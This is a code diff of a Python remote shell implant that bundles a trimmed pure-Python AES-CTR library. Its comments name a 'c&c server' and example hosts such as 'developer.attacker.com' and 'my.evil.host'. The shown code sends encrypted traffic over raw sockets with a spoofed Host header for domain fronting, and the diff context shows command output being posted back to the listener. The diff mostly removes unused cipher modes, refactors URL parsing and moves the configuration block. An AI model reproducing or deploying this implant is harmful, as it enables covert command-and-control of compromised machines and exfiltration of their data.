@@ -8,15 +8,15 @@ from time import sleep
 from subprocess import PIPE, Popen
 from random import randint
 import socket
+
 """
-PyAES Embedded Library -- Allows for cross platform compatibility with no outside dependencies.
+PyAES CTR Embedded Library Functions -- Allows for cross platform compatibility with no outside dependencies.
 Program logic around line 1068 ... 
 """
 import copy
 import struct
 
-__all__ = ["AES", "AESModeOfOperationCTR", "AESModeOfOperationCBC", "AESModeOfOperationCFB",
-           "AESModeOfOperationECB", "AESModeOfOperationOFB", "AESModesOfOperation", "Counter"]
+__all__ = ["AES", "AESModeOfOperationCTR", "AESModesOfOperation", "Counter"]
 
 
 def _compact_word(word):
@@ -38,7 +38,7 @@ def _concat_list(a, b):
 # Python 3 compatibility
 try:
     xrange
-except Exception:
+except NameError:
     xrange = range
 
 
@@ -656,202 +656,6 @@ class AESSegmentModeOfOperation(AESStreamModeOfOperation):
     segment_bytes = 16
 
 
-class AESModeOfOperationECB(AESBlockModeOfOperation):
-    """AES Electronic Codebook Mode of Operation.
-
-       o Block-cipher, so data must be padded to 16 byte boundaries
-
-   Security Notes:
-       o This mode is not recommended
-       o Any two identical blocks produce identical encrypted values,
-         exposing data patterns. (See the image of Tux on wikipedia)
-
-   Also see:
-       o https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_.28ECB.29
-       o See NIST SP800-38A (http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf); section 6.1"""
-
-    name = "Electronic Codebook (ECB)"
-
-    def encrypt(self, plaintext):
-        if len(plaintext) != 16:
-            raise ValueError('plaintext block must be 16 bytes')
-
-        plaintext = _string_to_bytes(plaintext)
-        return _bytes_to_string(self._aes.encrypt(plaintext))
-
-    def decrypt(self, ciphertext):
-        if len(ciphertext) != 16:
-            raise ValueError('ciphertext block must be 16 bytes')
-
-        ciphertext = _string_to_bytes(ciphertext)
-        return _bytes_to_string(self._aes.decrypt(ciphertext))
-
-
-class AESModeOfOperationCBC(AESBlockModeOfOperation):
-    """AES Cipher-Block Chaining Mode of Operation.
-
-       o The Initialization Vector (IV)
-       o Block-cipher, so data must be padded to 16 byte boundaries
-       o An incorrect initialization vector will only cause the first
-         block to be corrupt; all other blocks will be intact
-       o A corrupt bit in the cipher text will cause a block to be
-         corrupted, and the next block to be inverted, but all other
-         blocks will be intact.
-
-   Security Notes:
-       o This method (and CTR) ARE recommended.
-
-   Also see:
-       o https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher-block_chaining_.28CBC.29
-       o See NIST SP800-38A (http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf); section 6.2"""
-
-    name = "Cipher-Block Chaining (CBC)"
-
-    def __init__(self, key, iv=None):
-        if iv is None:
-            self._last_cipherblock = [0] * 16
-        elif len(iv) != 16:
-            raise ValueError('initialization vector must be 16 bytes')
-        else:
-            self._last_cipherblock = _string_to_bytes(iv)
-
-        AESBlockModeOfOperation.__init__(self, key)
-
-    def encrypt(self, plaintext):
-        if len(plaintext) != 16:
-            raise ValueError('plaintext block must be 16 bytes')
-
-        plaintext = _string_to_bytes(plaintext)
-        precipherblock = [(p ^ l) for (p, l) in zip(plaintext, self._last_cipherblock)]
-        self._last_cipherblock = self._aes.encrypt(precipherblock)
-
-        return _bytes_to_string(self._last_cipherblock)
-
-    def decrypt(self, ciphertext):
-        if len(ciphertext) != 16:
-            raise ValueError('ciphertext block must be 16 bytes')
-
-        cipherblock = _string_to_bytes(ciphertext)
-        plaintext = [(p ^ l) for (p, l) in zip(self._aes.decrypt(cipherblock), self._last_cipherblock)]
-        self._last_cipherblock = cipherblock
-
-        return _bytes_to_string(plaintext)
-
-
-class AESModeOfOperationCFB(AESSegmentModeOfOperation):
-    """AES Cipher Feedback Mode of Operation.
-
-       o A stream-cipher, so input does not need to be padded to blocks,
-         but does need to be padded to segment_size
-
-    Also see:
-       o https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_.28CFB.29
-       o See NIST SP800-38A (http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf); section 6.3"""
-
-    name = "Cipher Feedback (CFB)"
-
-    def __init__(self, key, iv, segment_size=1):
-        if segment_size == 0: segment_size = 1
-
-        if iv is None:
-            self._shift_register = [0] * 16
-        elif len(iv) != 16:
-            raise ValueError('initialization vector must be 16 bytes')
-        else:
-            self._shift_register = _string_to_bytes(iv)
-
-        self._segment_bytes = segment_size
-
-        AESBlockModeOfOperation.__init__(self, key)
-
-    segment_bytes = property(lambda s: s._segment_bytes)
-
-    def encrypt(self, plaintext):
-        if len(plaintext) % self._segment_bytes != 0:
-            raise ValueError('plaintext block must be a multiple of segment_size')
-
-        plaintext = _string_to_bytes(plaintext)
-
-        # Break block into segments
-        encrypted = []
-        for i in xrange(0, len(plaintext), self._segment_bytes):
-            plaintext_segment = plaintext[i: i + self._segment_bytes]
-            xor_segment = self._aes.encrypt(self._shift_register)[:len(plaintext_segment)]
-            cipher_segment = [(p ^ x) for (p, x) in zip(plaintext_segment, xor_segment)]
-
-            # Shift the top bits out and the ciphertext in
-            self._shift_register = _concat_list(self._shift_register[len(cipher_segment):], cipher_segment)
-
-            encrypted.extend(cipher_segment)
-
-        return _bytes_to_string(encrypted)
-
-    def decrypt(self, ciphertext):
-        if len(ciphertext) % self._segment_bytes != 0:
-            raise ValueError('ciphertext block must be a multiple of segment_size')
-
-        ciphertext = _string_to_bytes(ciphertext)
-
-        # Break block into segments
-        decrypted = []
-        for i in xrange(0, len(ciphertext), self._segment_bytes):
-            cipher_segment = ciphertext[i: i + self._segment_bytes]
-            xor_segment = self._aes.encrypt(self._shift_register)[:len(cipher_segment)]
-            plaintext_segment = [(p ^ x) for (p, x) in zip(cipher_segment, xor_segment)]
-
-            # Shift the top bits out and the ciphertext in
-            self._shift_register = _concat_list(self._shift_register[len(cipher_segment):], cipher_segment)
-
-            decrypted.extend(plaintext_segment)
-
-        return _bytes_to_string(decrypted)
-
-
-class AESModeOfOperationOFB(AESStreamModeOfOperation):
-    """AES Output Feedback Mode of Operation.
-
-       o A stream-cipher, so input does not need to be padded to blocks,
-         allowing arbitrary length data.
-       o A bit twiddled in the cipher text, twiddles the same bit in the
-         same bit in the plain text, which can be useful for error
-         correction techniques.
-
-    Also see:
-       o https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_.28OFB.29
-       o See NIST SP800-38A (http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf); section 6.4"""
-
-    name = "Output Feedback (OFB)"
-
-    def __init__(self, key, iv=None):
-        if iv is None:
-            self._last_precipherblock = [0] * 16
-        elif len(iv) != 16:
-            raise ValueError('initialization vector must be 16 bytes')
-        else:
-            self._last_precipherblock = _string_to_bytes(iv)
-
-        self._remaining_block = []
-
-        AESBlockModeOfOperation.__init__(self, key)
-
-    def encrypt(self, plaintext):
-        encrypted = []
-        for p in _string_to_bytes(plaintext):
-            if len(self._remaining_block) == 0:
-                self._remaining_block = self._aes.encrypt(self._last_precipherblock)
-                self._last_precipherblock = []
-            precipherbyte = self._remaining_block.pop(0)
-            self._last_precipherblock.append(precipherbyte)
-            cipherbyte = p ^ precipherbyte
-            encrypted.append(cipherbyte)
-
-        return _bytes_to_string(encrypted)
-
-    def decrypt(self, ciphertext):
-        # AES-OFB is symetric
-        return self.encrypt(ciphertext)
-
-
 class AESModeOfOperationCTR(AESStreamModeOfOperation):
     """AES Counter Mode of Operation.
 
@@ -909,10 +713,6 @@ class AESModeOfOperationCTR(AESStreamModeOfOperation):
 # Simple lookup table for each mode
 AESModesOfOperation = dict(
     ctr=AESModeOfOperationCTR,
-    cbc=AESModeOfOperationCBC,
-    cfb=AESModeOfOperationCFB,
-    ecb=AESModeOfOperationECB,
-    ofb=AESModeOfOperationOFB,
 )
 
 
@@ -1174,12 +974,6 @@ Main Program Logic Starts here
 
 """
 
-#  Configuration
-debug = False
-front_host = 'your.remote.host'  # your c&c server: example: developer.attacker.com
-url = 'localhost:8880'  # example: http://upwork.com:8880 - (include port of listener if not port 80 (http)
-host_header = str('Host: %s' % front_host)
-key = b"This_key_for_demo_purposes_only!"  # AES Encryption key - keep private, must be in byte form.
 # runtime variables
 connected = False
 
@@ -1225,7 +1019,7 @@ def denc(data):
             return decrypted
 
 
-def req(url, host, method='POST', page='/', payload=None):
+def req(url, host, method='POST', page=None, payload=None):
     """
     Socket powered HTTP client - replacement for requests
     :param url: socket connect to url:port
@@ -1246,13 +1040,37 @@ def req(url, host, method='POST', page='/', payload=None):
         rx_to_first = r'^.*?{}'.format(re.escape(clrf))
         return str(re.sub(rx_to_first, '', data, flags=re.DOTALL).strip())
 
+    def url_parse(url):
+        """
+        Parse url (example format: http:cloudflare.com:8080 or cloudflare.com:80)
+        :param url: domain name and port (upwork.com:80)
+        :return: url, port
+        """
+        if re.match(r"http|https", url):
+            url = url.split('://')
+            url = url[1]
+            url = url.split(':')
+            host = url[0]
+            port = int(url[1])
+            return host, port
+        else:
+            host = url.split(':')[0]
+            port = int(url.split(':')[1])
+            return host, port
+
     def post(url, host, payload):
-        _url = url.split(':')
-        url = _url[0]
-        port = int(_url[1])
+        """
+        HTTP Custom POST function
+        :param url: connect to this host (format: upwork.com)
+        :param host: send this host head (example: my.server.com)
+        :param payload: send this data
+        :return: parsed HTML text
+        """
+        url, port = url_parse(url)
+
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             content_len = len(payload)
-            http_req = "POST /write_bin.sh HTTP/1.0\r\nHost: %s\r\nAccept: text/html\r\n" \
+            http_req = "POST /lol HTTP/1.0\r\nHost: %s\r\nAccept: text/html\r\n" \
                        "Content-Length: %s\r\n\r\n%s" % (host,
                                                          content_len, payload)
             http_req += payload
@@ -1268,10 +1086,16 @@ def req(url, host, method='POST', page='/', payload=None):
 
             return parse_resp(data.decode())
 
-    def get(url, host, page):
-        _url = url.split(':')
-        url = _url[0]
-        port = int(_url[1])
+    def get(url, host, page='/'):
+        """
+        HTTP Custom GET Function
+        :param url: connect to this host (example: upwork.com)
+        :param host: send this host header (example: my.evil.host)
+        :param page: get this page (/index.html)
+        :return: parsed HTML text
+        """
+        url, port = url_parse(url)
+
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             get_str = "GET %s HTTP/1.0\r\nHost: %s\r\nAccept: text/html\r\n\r\n" % (page, host)
             s.connect((url, port))
@@ -1296,6 +1120,7 @@ class Result:
     """
     Empty object to store result of commands
     """
+
     def __init__(self, status_code=None, stdout=None, stderr=None, command=None):
         self.status_code = status_code
         self.stdout = stdout
@@ -1401,7 +1226,16 @@ def shell():
                                     print('Post reply: %s' % ret)
                                 # Send output of command back to HTTP listener
                                 req(url=url, host=front_host, method='POST', page='', payload=ret)
+
                                 return
+
+
+#  Configuration
+debug = False
+front_host = 'your.remote.host'  # your c&c server: example: developer.attacker.com
+url = 'localhost:8080'  # example: http://upwork.com:8880 - (include port of listener if not port 80 (http)
+host_header = str('Host: %s' % front_host)
+key = b"This_key_for_demo_purposes_only!"  # AES Encryption key - keep private, must be in byte form.
 
 
 def main():
